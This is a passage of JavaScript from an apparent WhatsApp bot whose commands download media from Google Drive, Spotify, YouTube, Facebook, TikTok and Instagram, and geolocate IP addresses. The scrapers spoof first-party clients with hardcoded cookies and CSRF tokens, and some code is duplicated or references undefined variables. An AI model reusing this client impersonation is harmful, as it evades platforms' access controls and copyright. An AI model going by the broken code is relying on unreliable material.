        return m.reply(`Example: ${prefix + command} url`);
    }

    async function GDriveDl(url) {
        let id = (url.match(/\/?id=(.+)/i) || url.match(/\/d\/(.*?)\//))?.[1];
        if (!id) return m.reply('ID Not Found');

        let res = await fetch(`https://drive.google.com/uc?id=${id}&authuser=0&export=download`, {
            method: 'post',
            headers: {
                'accept-encoding': 'gzip, deflate, br',
                'content-length': 0,
                'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
                'origin': 'https://drive.google.com',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
                'x-client-data': 'CKG1yQEIkbbJAQiitskBCMS2yQEIqZ3KAQioo8oBGLeYygE=',
                'x-drive-first-party': 'DriveWebUi',
                'x-json-requested': 'true'
            }
        });

        let { fileName, sizeBytes, downloadUrl } = JSON.parse((await res.text()).slice(4));
        if (!downloadUrl) return m.reply('Link Download Limit!');

        let data = await fetch(downloadUrl);
        if (data.status !== 200) throw data.statusText;

        return {
            downloadUrl,
            fileName,
            fileSize: (sizeBytes / 1024 / 1024).toFixed(2),
            mimetype: data.headers.get('content-type')
        };
    }

    try {
        let data = await GDriveDl(text);
        let caption = `*Google Drive*\n\nNama: ${data.fileName}\nLink: ${data.downloadUrl}`;
        m.reply(caption);
        await lilychan.sendMessage(m.chat, {
            document: { url: data.downloadUrl },
            fileName: data.fileName,
            mimetype: data.mimetype
        }, { quoted: m });
    } catch (error) {
        m.reply(`${error.message}`);
    }
}
break;
case 'spotify': {
    if (!args[0]) {
        return m.reply(`Kasih judulnya\n\nExample : ${prefix + command} Raksasa Giant Jay`);
    }

    // Mencari track di Spotify
    let searchM = await searchSpotifyTrack(text);
    let hasil = searchM.externalUrl;
    let lily = await spotifydll(hasil);
    let result = lily.download;

    // Membuat gambar Spotify
    const spotifyImage = await new canvafy.Spotify()
        .setAuthor(`Spotify Music x Lilychanj Bot`)
        .setAlbum(`${lily.artis}`)
        .setTimestamp(121000, 263400)
        .setImage(`${lily.image}`)
        .setTitle(`${lily.title}`)
        .setBlur(5)
        .setOverlayOpacity(0.7)
        .build();

    let gambar = spotifyImage;

    // Mengirim pesan dengan gambar
    let senTamcan = await lilychan.sendMessage(m.chat, {
        image: gambar,
        caption: `*[ 𝙎𝙥𝙤𝙩𝙞𝙛𝙮 𝙈𝙪𝙨𝙞𝙘 ]*\n\n> TITLE : ${lily.title}\n> Artis : ${lily.artis}\n> DURASI : ${lily.durasi}\n\n> Audio Akan Dikirim Segera!!`
    }, {
        quoted: m
    });

    // Mengirim audio
    await lilychan.sendMessage(m.chat, {
        audio: { url: result },
        mimetype: "audio/mpeg",
        ptt: false
    }, {
        quoted: senTamcan
    });
}
break;
case 'ytmp4': case 'ytv':{
        	if (!args[0]) return m.reply(`Input Parameter Url Dari ${command}\n\nExample : ${prefix + command} Url`)
        m.reply('Waiting...')
          try {
        const url = args[0];     
        const data = await ytdl(url);
        let result = data.video;

        // Memilih resolusi video yang diinginkan
        let resolution = '1080'; // Anda bisa mengganti ini dengan resolusi lain jika diinginkan

// Memeriksa apakah resolusi yang diminta tersedia
    if (result[resolution] && result[resolution].url) {
    let videoUrl = result[resolution].url;

    await lilychan.sendMessage(m.chat, {
        video: {
            url: videoUrl,
        },
        caption: '```Success...\nDont forget to donate```',
        mimetype: 'video/mp4'
    }, {
        quoted: qchanel
    });
 } else {
    // Tangani kasus jika video tidak tersedia dalam resolusi yang diminta
    await lilychan.sendMessage(m.chat, {
        text: 'Video tidak tersedia dalam resolusi yang diminta.'
    }, {
        quoted: qchanel
    });
 }
  } catch (error) {
    console.error('Error:', error);
    if (error.statusCode === 403) {
      await m.reply('Download Gagal.');
    } else {
      await m.reply('Error.');
    }
  }
}
break
case 'ytmp3':
case 'yta': {
    if (!args[0]) {
        return m.reply(`Input Parameter Url Dari ${command}\n\nExample : ${prefix + command} Url`);
    }

    await lilychan.sendMessage(m.chat, { react: { text: "🕐", key: m.key } });

    try {
        const url = args[0];       
        let data = await ytdl(url);
        
        await lilychan.sendMessage(m.chat, { react: { text: "✅", key: m.key } });
        await lilychan.sendMessage(m.chat, { 
            audio: { url: data.audio }, 
            mimetype: "audio/mpeg", 
            ptt: false 
        }, { quoted: qchanel });
    } catch (error) {
        console.error('Error:', error);
        if (error.statusCode === 403) {
            await m.reply('Download Gagal.');
        } else {
            await m.reply('Error.');
        }
    }
}
break;
case 'fbvid':
case 'fbvideo':
case 'facebook':
case 'fb': {
    try {
        async function facebook(link) {
            return new Promise((resolve, reject) => {
                let config = {
                    'url': link
                };

                axios('https://www.getfvid.com/downloader', {
                    method: 'POST',
                    data: new URLSearchParams(Object.entries(config)),
                    headers: {
                        "content-type": "application/x-www-form-urlencoded",
                        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
                        "cookie": "_ga=GA1.2.1310699039.1624884412; _pbjs_userid_consent_data=3524755945110770; cto_bidid=rQH5Tl9NNm5IWFZsem00SVVuZGpEd21sWnp0WmhUeTZpRXdkWlRUOSUyQkYlMkJQQnJRSHVPZ3Fhb1R2UUFiTWJuVGlhVkN1TGM2anhDT1M1Qk0ydHlBb21LJTJGNkdCOWtZalRtZFlxJTJGa3FVTG1TaHlzdDRvJTNE; cto_bundle=g1Ka319NaThuSmh6UklyWm5vV2pkb3NYaUZMeWlHVUtDbVBmeldhNm5qVGVwWnJzSUElMkJXVDdORmU5VElvV2pXUTJhQ3owVWI5enE1WjJ4ZHR5NDZqd1hCZnVHVGZmOEd0eURzcSUyQkNDcHZsR0xJcTZaRFZEMDkzUk1xSmhYMlY0TTdUY0hpZm9NTk5GYXVxWjBJZTR0dE9rQmZ3JTNEJTNE; _gid=GA1.2.908874955.1625126838; __gads=ID=5be9d413ff899546-22e04a9e18ca0046:T=1625126836:RT=1625126836:S=ALNI_Ma0axY94aSdwMIg95hxZVZ-JGNT2w; cookieconsent_status=dismiss"
                    }
                })
                .then(async ({ data }) => {
                    const $ = cheerio.load(data);
                    resolve({
                        video_sd: $('body > div.page-content > div > div > div.col-lg-10.col-md-10.col-centered > div > div:nth-child(3) > div > div.col-md-4.btns-download > p:nth-child(1) > a').attr('href'),
                        video_hd: $('body > div.page-content > div > div > div.col-lg-10.col-md-10.col-centered > div > div:nth-child(3) > div > div.col-md-4.btns-download > p:nth-child(1) > a').attr('href'),
                        audio: $('body > div.page-content > div > div > div.col-lg-10.col-md-10.col-centered > div > div:nth-child(3) > div > div.col-md-4.btns-download > p:nth-child(2) > a').attr('href')
                    });
                })
                .catch(reject);
            });
        }

        if (!args[0]) {
            return m.reply(`Input Parameter Url Dari ${command}\n\nExample : ${prefix + command} https://www.facebook.com/share/r/W1aQyk6akR6c3iqL/?mibextid=Ev0aEO`);
        }

        let llilycwwan = await facebook(text);
        await lilychan.sendMessage(m.chat, { react: { text: "🕐", key: m.key } });

        lilychan.sendMessage(m.chat, {
            video: {
                url: llilycwwan.video_hd
            },
            caption: '```Success...\nDont forget to donate```'
        }, {
            quoted: qchanel
        });
    } catch (e) {
        console.log(e);
        m.reply('🚩 Terjadi kesalahan saat memuat data..');
    }
}
break;
/*      case 'ttslide':
        case 'tiktokimg':
        {
        	if (!args[0]) return m.reply(`Input Parameter Url Dari ${command}\n\nExample : ${prefix + command} Url`)
        m.reply('🚩Gambar Akan Dikirim Melalui Private Chat')
        let api = await fetch(`https://api.betabotz.eu.org/api/download/ttslide?url=${args[0]}&apikey=${btz}`)
        let lilycwan = await api.json();
        for (let i of lilycwan.result.images) {
        lilychan.sendMessage(m.sender, {
        image: {
        	url: i
        },
        caption: ''
        }, {
        	quoted: m
        })
        }
        }
        break
*/
case 'ttslide':
case 'ttfoto': {
    if (!args[0]) {
        return m.reply(`Input Parameter Url Dari ${command}\n\nExample : ${prefix + command} Url`);
    }

    let push = [];
    let api = await fetch(`https://api.betabotz.eu.org/api/download/ttslide?url=${args[0]}&apikey=${btz}`);
    let lilycwan = await api.json();

    for (let i of lilycwan.result.images) {
        let tsst = await prepareWAMessageMedia({
            'image': { url: i }
        }, {
            'upload': lilychan.waUploadToServer
        });

        push.push({
            body: proto.Message.InteractiveMessage.Body.fromObject({
                text: ``
            }),
            footer: proto.Message.InteractiveMessage.Footer.fromObject({
                text: `— S3NS31#404.`
            }),
            header: proto.Message.InteractiveMessage.Header.fromObject({
                title: ``,
                hasMediaAttachment: true,
                ...tsst
            }),
            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
                    {
                        // Button properties can be added here if needed
                    }
                ]
            })
        });
    }

    const msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                    body: proto.Message.InteractiveMessage.Body.create({
                        text: ``
                    }),
                    footer: proto.Message.InteractiveMessage.Footer.create({
                        text: ``
                    }),
                    header: proto.Message.InteractiveMessage.Header.create({
                        hasMediaAttachment: false
                    }),
                    carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                        cards: [
                            ...push
                        ]
                    })
                })
            }
        }
    }, { quoted: m });

    await lilychan.relayMessage(m.chat, msg.message, {
        messageId: msg.key.id
    });
}
break;
case 'tt':
case 'tiktok': {
    if (!text) {
        return m.reply(`masukan link tiktoknya`);
    }

    await lilychan.sendMessage(m.chat, { react: { text: "🕐", key: m.key } });

    let { tiktok2 } = require("./lib/tiktokdl");
    let old = new Date();
    let tanaka = await tiktok2(`${text}`);
    
    let anjay = await lilychan.sendMessage(m.chat, { 
        video: { url: tanaka.no_watermark }, 
        caption: tanaka.title 
    }, { quoted: qchanel });

    await lilychan.sendMessage(m.chat, { 
        audio: { url: tanaka.music }, 
        mimetype: "audio/mpeg", 
        ptt: false 
    }, { quoted: anjay });
}
break;
case 'ig':
case 'instagram': {
    if (!text) return m.reply(`Anda perlu memberikan URL video, reel`);

const axios = require('axios');
const cheerio = require('cheerio');
const qs = require('qs');

const HEADERS = {
    Accept: '*/*',
    'Accept-Language': 'en-US,en;q=0.5',
    'Content-Type': 'application/x-www-form-urlencoded',
    'X-FB-Friendly-Name': 'PolarisPostActionLoadPostQueryQuery',
    'X-CSRFToken': 'RVDUooU5MYsBbS1CNN3CzVAuEP8oHB52',
    'X-IG-App-ID': '1217981644879628',
    'X-FB-LSD': 'AVqbxe3J_YA',
    'X-ASBD-ID': '129477',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-G973U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/14.2 Chrome/87.0.4280.141 Mobile Safari/537.36'
};

function getInstagramPostId(url) {
    const regex = /(?:https?:\/\/)?(?:www\.)?instagram\.com\/(?:p|tv|reel)\/([^/?#&]+).*/;
    const match = url.match(regex);
    return match ? match[1] : null;
};

function encodeGraphqlRequestData(shortcode) {
    const requestData = {
        av: "0",
        __d: "www",
        __user: "0",
        __a: "1",
        __req: "3",
        __hs: "19624.HYP:instagram_web_pkg.2.1..0.0",
        dpr: "3",
        __ccg: "UNKNOWN",
        __rev: "1008824440",
        __s: "xf44ne:zhh75g:xr51e7",
        __hsi: "7282217488877343271",
        __dyn: "7xeUmwlEnwn8K2WnFw9-2i5U4e0yoW3q32360CEbo1nEhw2nVE4W0om78b87C0yE5ufz81s8hwGwQwoEcE7O2l0Fwqo31w9a9x-0z8-U2zxe2GewGwso88cobEaU2eUlwhEe87q7-0iK2S3qazo7u1xwIw8O321LwTwKG1pg661pwr86C1mwraCg",
        __csr: "gZ3yFmJkillQvV6ybimnG8AmhqujGbLADgjyEOWz49z9XDlAXBJpC7Wy-vQTSvUGWGh5u8KibG44dBiigrgjDxGjU0150Q0848azk48N09C02IR0go4SaR70r8owyg9pU0V23hwiA0LQczA48S0f-x-27o05NG0fkw",
        __comet_req: "7",
        lsd: "AVqbxe3J_YA",
        jazoest: "2957",
        __spin_r: "1008824440",
        __spin_b: "trunk",
        __spin_t: "1695523385",
        fb_api_caller_class: "RelayModern",
        fb_api_req_friendly_name: "PolarisPostActionLoadPostQueryQuery",
        variables: JSON.stringify({
            shortcode: shortcode,
            fetch_comment_count: null,
            fetch_related_profile_media_count: null,
            parent_comment_count: null,
            child_comment_count: null,
            fetch_like_count: null,
            fetch_tagged_user_count: null,
            fetch_preview_comment_count: null,
            has_threaded_comments: false,
            hoisted_comment_id: null,
            hoisted_reply_id: null,
        }),
        server_timestamps: "true",
        doc_id: "10015901848480474",
    };

    return qs.stringify(requestData);
};

async function getPostGraphqlData(postId, proxy) {
    try {
        const encodedData = encodeGraphqlRequestData(postId);
        const response = await axios.post('https://www.instagram.com/api/graphql', encodedData, { headers: HEADERS, httpsAgent: proxy });
        return response.data;
    } catch (error) {
        throw error;
    }
};

function extractPostInfo(mediaData) {
    try {
        const getUrlFromData = (data) => {
            if (data.edge_sidecar_to_children) {
                return data.edge_sidecar_to_children.edges
                    .map(edge => edge.node.video_url || edge.node.display_url);
            }
            return data.video_url ? [data.video_url] : [data.display_url];
        };

        return {
            creator: '@sensei#404',
            status: true,
            data: {
                url: getUrlFromData(mediaData),
                caption: mediaData.edge_media_to_caption.edges[0]?.node.text || null,
                username: mediaData.owner.username,
                like: mediaData.edge_media_preview_like.count,
                comment: mediaData.edge_media_to_comment.count,
                isVideo: mediaData.is_video,
            }
        };
    } catch (error) {
        throw error;
    }
};

async function directScrape(url, proxy = null) {
    try {
        const postId = getInstagramPostId(url);
        if (!postId) {
            throw new Error('Invalid Instagram URL');
        }

        const data = await getPostGraphqlData(postId, proxy);
        const mediaData = data.data?.xdt_shortcode_media;

        if (!mediaData) {
            return null;
        }

        return extractPostInfo(mediaData);
    } catch (error) {
        return {
            creator: '@sensei#404',
            status: false,
            message: error.message
        };
    }
};

const varHeaders = {
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'no-cache',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Microsoft Edge";v="110"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/124.0.0.0',
};

let grapHeaders = {
    'Accept': 'application/json',
    'Accept-Language': 'en-US,en;q=0.9',
    'Cache-Control': 'no-cache',
    'Dnt': '1',
    'Pragma': 'no-cache',
    'Referer': '',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0',
    'X-Csrftoken': 'EuZcvVSeiRAC60CJQRrRC6',
    'X-Ig-App-Id': '936619743392459',
    'X-Ig-Www-Claim': '0',
    'X-Requested-With': 'XMLHttpRequest'
}

async function userGraphql(url) {
    try {
        let body = await axios.get(url, {
            headers: varHeaders,
        }).then(res => res.data)
        
        let user_id = body.match(/<meta\s+property="instapp:owner_user_id"\s+content="(\d+)"/)[1]
        let video_id = body.match(/instagram:\/\/media\?id=(\d+)/)[1]

        const graphUrl = `https://www.instagram.com/graphql/query/?doc_id=7571407972945935&variables=%7B%22id%22%3A%22${user_id}%22%2C%22include_clips_attribution_info%22%3Afalse%2C%22first%22%3A1000%7D`

        console.log('graphUrl: ', graphUrl)
        const graph = await axios.get(graphUrl, {
            method: 'GET',
            headers: grapHeaders,
            httpsAgent: httpsProxyAgent
        }).then(response => response.data)

        // Ambil video dari respons
        const edges = graph.data.user.edge_owner_to_timeline_media.edges;
        let videoData = edges.find(edge => edge.node.id === video_id);

        if (!videoData) {
            return {
                creator: '@sensei#404',
                status: false,
                message: 'Video not found'
            };
        }

        // Memastikan bahwa videoData.node ada
        videoData = videoData.node;

        const getUrlFromData = (videoData) => {
            // Jika videoData memiliki edge_sidecar_to_children, ambil semua video URLs dari children
            if (videoData.edge_sidecar_to_children) {
                return videoData.edge_sidecar_to_children.edges
                    .map(edge => edge.node.video_url || edge.node.display_url); // Ambil video_url dari setiap video
            }
        
            // Jika tidak ada edge_sidecar_to_children, gunakan video_url dari videoData
            return videoData.video_url ? [videoData.video_url] : [ videoData.display_url ];
        };

        const listUrl = getUrlFromData(videoData)

        return {
            creator: '@.',
            status: true,
            data: {
                url: listUrl,
                caption: videoData['edge_media_to_caption']['edges'].length > 0 ? videoData['edge_media_to_caption']['edges'][0]['node']['text'] : null,
                username: videoData['owner']['username'],
                like: videoData['edge_media_preview_like']['count'],
                comment: videoData['edge_media_to_comment']['count'],
                isVideo: videoData['is_video'],
            }
        };
    } catch (error) {
        return {
            creator: '@.',
            status: false,
            message: error.message
        };
      }
    }
    let lilycwan = await directScrape(text);
    m.reply(mess.wait);
    let caption = `\`INSTAGRAM DOWNLOADER\`
        
Username : ${lilycwan.data.username}
Like : ${lilycwan.data.like}
Comment : ${lilycwan.data.comment}
Caption : ${lilycwan.data.caption}  
`

    //Mengambil semua hasil array  
    for (let i of lilycwan.data.url) {
        lilychan.sendMessage(m.chat, { video: { url: i }, caption: caption }, { quoted: qchanel });
    }
}
break;
case 'igfoto':
case 'igimg': {
    if (!text) return m.reply(`Anda perlu memberikan URL video, reel`);

const axios = require('axios');
const cheerio = require('cheerio');
const qs = require('qs');

const HEADERS = {
    Accept: '*/*',
    'Accept-Language': 'en-US,en;q=0.5',
    'Content-Type': 'application/x-www-form-urlencoded',
    'X-FB-Friendly-Name': 'PolarisPostActionLoadPostQueryQuery',
    'X-CSRFToken': 'RVDUooU5MYsBbS1CNN3CzVAuEP8oHB52',
    'X-IG-App-ID': '1217981644879628',
    'X-FB-LSD': 'AVqbxe3J_YA',
    'X-ASBD-ID': '129477',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-G973U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/14.2 Chrome/87.0.4280.141 Mobile Safari/537.36'
};

function getInstagramPostId(url) {
    const regex = /(?:https?:\/\/)?(?:www\.)?instagram\.com\/(?:p|tv|reel)\/([^/?#&]+).*/;
    const match = url.match(regex);
    return match ? match[1] : null;
};

function encodeGraphqlRequestData(shortcode) {
    const requestData = {
        av: "0",
        __d: "www",
        __user: "0",
        __a: "1",
        __req: "3",
        __hs: "19624.HYP:instagram_web_pkg.2.1..0.0",
        dpr: "3",
        __ccg: "UNKNOWN",
        __rev: "1008824440",
        __s: "xf44ne:zhh75g:xr51e7",
        __hsi: "7282217488877343271",
        __dyn: "7xeUmwlEnwn8K2WnFw9-2i5U4e0yoW3q32360CEbo1nEhw2nVE4W0om78b87C0yE5ufz81s8hwGwQwoEcE7O2l0Fwqo31w9a9x-0z8-U2zxe2GewGwso88cobEaU2eUlwhEe87q7-0iK2S3qazo7u1xwIw8O321LwTwKG1pg661pwr86C1mwraCg",
        __csr: "gZ3yFmJkillQvV6ybimnG8AmhqujGbLADgjyEOWz49z9XDlAXBJpC7Wy-vQTSvUGWGh5u8KibG44dBiigrgjDxGjU0150Q0848azk48N09C02IR0go4SaR70r8owyg9pU0V23hwiA0LQczA48S0f-x-27o05NG0fkw",
        __comet_req: "7",
        lsd: "AVqbxe3J_YA",
        jazoest: "2957",
        __spin_r: "1008824440",
        __spin_b: "trunk",
        __spin_t: "1695523385",
        fb_api_caller_class: "RelayModern",
        fb_api_req_friendly_name: "PolarisPostActionLoadPostQueryQuery",
        variables: JSON.stringify({
            shortcode: shortcode,
            fetch_comment_count: null,
            fetch_related_profile_media_count: null,
            parent_comment_count: null,
            child_comment_count: null,
            fetch_like_count: null,
            fetch_tagged_user_count: null,
            fetch_preview_comment_count: null,
            has_threaded_comments: false,
            hoisted_comment_id: null,
            hoisted_reply_id: null,
        }),
        server_timestamps: "true",
        doc_id: "10015901848480474",
    };

    return qs.stringify(requestData);
};

async function getPostGraphqlData(postId, proxy) {
    try {
        const encodedData = encodeGraphqlRequestData(postId);
        const response = await axios.post('https://www.instagram.com/api/graphql', encodedData, { headers: HEADERS, httpsAgent: proxy });
        return response.data;
    } catch (error) {
        throw error;
    }
};

function extractPostInfo(mediaData) {
    try {
        const getUrlFromData = (data) => {
            if (data.edge_sidecar_to_children) {
                return data.edge_sidecar_to_children.edges
                    .map(edge => edge.node.video_url || edge.node.display_url);
            }
            return data.video_url ? [data.video_url] : [data.display_url];
        };

        return {
            creator: '@sensei#404',
            status: true,
            data: {
                url: getUrlFromData(mediaData),
                caption: mediaData.edge_media_to_caption.edges[0]?.node.text || null,
                username: mediaData.owner.username,
                like: mediaData.edge_media_preview_like.count,
                comment: mediaData.edge_media_to_comment.count,
                isVideo: mediaData.is_video,
            }
        };
    } catch (error) {
        throw error;
    }
};

async function directScrape(url, proxy = null) {
    try {
        const postId = getInstagramPostId(url);
        if (!postId) {
            throw new Error('Invalid Instagram URL');
        }

        const data = await getPostGraphqlData(postId, proxy);
        const mediaData = data.data?.xdt_shortcode_media;

        if (!mediaData) {
            return null;
        }

        return extractPostInfo(mediaData);
    } catch (error) {
        return {
            creator: '@sensei#404',
            status: false,
            message: error.message
        };
    }
};

const varHeaders = {
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'no-cache',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Microsoft Edge";v="110"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/124.0.0.0',
};

let grapHeaders = {
    'Accept': 'application/json',
    'Accept-Language': 'en-US,en;q=0.9',
    'Cache-Control': 'no-cache',
    'Dnt': '1',
    'Pragma': 'no-cache',
    'Referer': '',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0',
    'X-Csrftoken': 'EuZcvVSeiRAC60CJQRrRC6',
    'X-Ig-App-Id': '936619743392459',
    'X-Ig-Www-Claim': '0',
    'X-Requested-With': 'XMLHttpRequest'
}

async function userGraphql(url) {
    try {
        let body = await axios.get(url, {
            headers: varHeaders,
        }).then(res => res.data)
        
        let user_id = body.match(/<meta\s+property="instapp:owner_user_id"\s+content="(\d+)"/)[1]
        let video_id = body.match(/instagram:\/\/media\?id=(\d+)/)[1]

        const graphUrl = `https://www.instagram.com/graphql/query/?doc_id=7571407972945935&variables=%7B%22id%22%3A%22${user_id}%22%2C%22include_clips_attribution_info%22%3Afalse%2C%22first%22%3A1000%7D`

        console.log('graphUrl: ', graphUrl)
        const graph = await axios.get(graphUrl, {
            method: 'GET',
            headers: grapHeaders,
            httpsAgent: httpsProxyAgent
        }).then(response => response.data)

        // Ambil video dari respons
        const edges = graph.data.user.edge_owner_to_timeline_media.edges;
        let videoData = edges.find(edge => edge.node.id === video_id);

        if (!videoData) {
            return {
                creator: '@sensei#404',
                status: false,
                message: 'Video not found'
            };
        }

        // Memastikan bahwa videoData.node ada
        videoData = videoData.node;

        const getUrlFromData = (videoData) => {
            // Jika videoData memiliki edge_sidecar_to_children, ambil semua video URLs dari children
            if (videoData.edge_sidecar_to_children) {
                return videoData.edge_sidecar_to_children.edges
                    .map(edge => edge.node.video_url || edge.node.display_url); // Ambil video_url dari setiap video
            }
        
            // Jika tidak ada edge_sidecar_to_children, gunakan video_url dari videoData
            return videoData.video_url ? [videoData.video_url] : [ videoData.display_url ];
        };

        const listUrl = getUrlFromData(videoData)

        return {
            creator: '@.',
            status: true,
            data: {
                url: listUrl,
                caption: videoData['edge_media_to_caption']['edges'].length > 0 ? videoData['edge_media_to_caption']['edges'][0]['node']['text'] : null,
                username: videoData['owner']['username'],
                like: videoData['edge_media_preview_like']['count'],
                comment: videoData['edge_media_to_comment']['count'],
                isVideo: videoData['is_video'],
            }
        };
    } catch (error) {
        return {
            creator: '@.',
            status: false,
            message: error.message
        };
      }
    }

    let lilycwan = await directScrape(text);
    m.reply(mess.wait);
    //Mengambil semua hasil array  
    for (let i of lilycwan.data.url) {
        lilychan.sendMessage(m.chat, { image: { url: i }, caption: '' }, { quoted: qchanel });
    }
}
break;
  /*
async function snack(url) {
  const res = await fetch(url)
  const body = await res.text()
  const $ = cheerio.load(body)
  const video = $("div.video-box").find("a-video-player")
  const author = $("div.author-info")
  const attr = $("div.action")
  
  const data = {
    title: $(author).find("div.author-desc > span").children("span").eq(0).text().trim(),
    thumbnail: $(video).parent().siblings("div.background-mask").children("img").attr("src"),
    media: $(video).attr("src"),
    author: $("div.author-name").text().trim(),
    authorImage: $(attr).find("div.avatar > img").attr("src"),
    like: $(attr).find("div.common").eq(0).text().trim(),
    comment: $(attr).find("div.common").eq(1).text().trim(),
    share: $(attr).find("div.common").eq(2).text().trim(),
  }
  return data
}
snack("https://www.snackvideo.com/@kwai/video/5229110747862602731?pwa_source=web_share")
*/
case 'videy': {
    if (!text) return m.reply("mana linknya?");
    
    await lilychan.sendMessage(m.chat, { react: { text: "🕐", key: m.key } });
    
    var anu = text.replace("v?id=", "");
    var mannr = anu.replace("https://", "https://cdn.");
    
    lilychan.sendMessage(m.chat, { 
        video: { url: mannr + ".mp4" }, 
        caption: '```Success...\nDont forget to donate```' 
    }, { quoted: qchanel });
    
    await lilychan.sendMessage(m.chat, { react: { text: "✅", key: m.key } });
}
break;

case 'yts':
case 'ytsearch': {
    if (!text) return m.reply(`Example : ${prefix + command} story wa anime`);
    
    let yts = require("yt-search");
    let search = await yts(text);
    let teks = 'YouTube Search\n\nResult From ' + text + '\n\n';
    let no = 1;
    
    for (let i of search.all) {
        teks += `❑ No : ${no++}\n` +
                `◦  Type : ${i.type}\n` +
                `❑ Video ID : ${i.videoId}\n` +
                `❑ Title : ${i.title}\n` +
                `❑ Views : ${i.views}\n` +
                `❑ Duration : ${i.timestamp}\n` +
                `❑ Upload At : ${i.ago}\n` +
                `◦  Author : ${i.author.name}\n` +
                `❑ Url : ${i.url}\n\n` +
                `─────────────────\n\n`;
    }
    
    lilychan.sendMessage(m.chat, { 
        image: { url: search.all[0].thumbnail },  
        caption: teks 
    }, { quoted: m });
}
break;
//<================================================>//
/*
 
 
                    [ SCRIPT LILY ]
    I share this script for free without spending any money, and I forbid anyone from selling this script. please report to Tanaka Senn if anyone is caught selling script Lilychanj 
                   < INTERNET FITUR >

*/
//<================================================>//
case 'glosarium': {
    if (!q) return m.reply(`cari apa gerangan`);

    const axios = require('axios');
    const cheerio = require('cheerio');

    // wm avz
    async function vozzz(query, m) {
        try {
            const url = `https://glosarium.org/arti-${query}`;
            const { data } = await axios.get(url);
            const $ = cheerio.load(data);
            const heading = $(`h2:contains("${query}")`);

            // wm avz 
            if (heading.length === 0) {
                m.reply(`Pengertian untuk ${query} tidak ditemukan.`);
                return;
            }

            const definition = heading
                .next('table.definisi')
                .find('td.defn')
                .map((i, el) => $(el).text().trim())
                .get();

            if (definition.length > 0) {
                m.reply(definition.join('\n\n'));
            } else {
                m.reply(`Definisi untuk ${query} tidak ditemukan.`);
            } // wm avz
        } catch (error) {
            m.reply('Terjadi kesalahan saat mengambil data.');
        }
    }

    vozzz(`${encodeURIComponent(text)}`, m);
}
break;
case "jarak": {
    var [darii, to] = text.split`|`;
    
    if (!(darii && to)) return m.reply(`Ex: ${prefix + command} jakarta|bandung`);
    
    var data = await jarak(darii, to);
    
    if (data.img) {
        return lilychan.sendMessage(m.chat, { 
            image: data.img, 
            caption: data.desc 
        }, { quoted: m });
    } else {
        m.reply(data.desc);
    }
}
break;

case 'trackip': {
    if (!text) return m.reply(`*Example:* ${prefix + command} 112.90.150.204`);
    
    try {
        let res = await fetch(`https://ipwho.is/${text}`).then(result => result.json());

        const formatIPInfo = (info) => {
            return `
*IP Information*
• IP: ${info.ip || 'N/A'}
• Success: ${info.success || 'N/A'}
• Type: ${info.type || 'N/A'}
• Continent: ${info.continent || 'N/A'}
• Continent Code: ${info.continent_code || 'N/A'}
• Country: ${info.country || 'N/A'}
• Country Code: ${info.country_code || 'N/A'}
• Region: ${info.region || 'N/A'}
• Region Code: ${info.region_code || 'N/A'}
• City: ${info.city || 'N/A'}
• Latitude: ${info.latitude || 'N/A'}
• Longitude: ${info.longitude || 'N/A'}
